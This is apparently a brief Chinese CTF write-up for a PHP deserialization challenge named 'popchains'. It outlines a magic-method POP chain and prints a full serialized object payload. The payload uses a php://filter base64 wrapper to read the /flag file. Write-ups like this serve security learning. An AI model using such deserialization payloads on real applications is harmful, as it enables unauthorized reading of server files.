---
title: popchains
date: 2026-02-08 12:00:00
tags:
  - 题解
  - 反序列化
---

这里得到flag的执行逻辑 触发__wakeup()->触发__toString()->触发__get()->触发__invoke()->include($value);构造payload：

O:12:"Road_is_Long":2:{s:4:"page";r:1;s:6:"string";O:13:"Make_a_Change":1:{s:6:"effort";O:13:"Try_Work_Hard":1:{s:6:"var";s:49:"php://filter/convert.base64-encode/resource=/flag";}}编码后输入得到flag的base64编码然后解码得到flag


![popchains_e3e0bee5](/images/writeups/popchains_e3e0bee5.png)
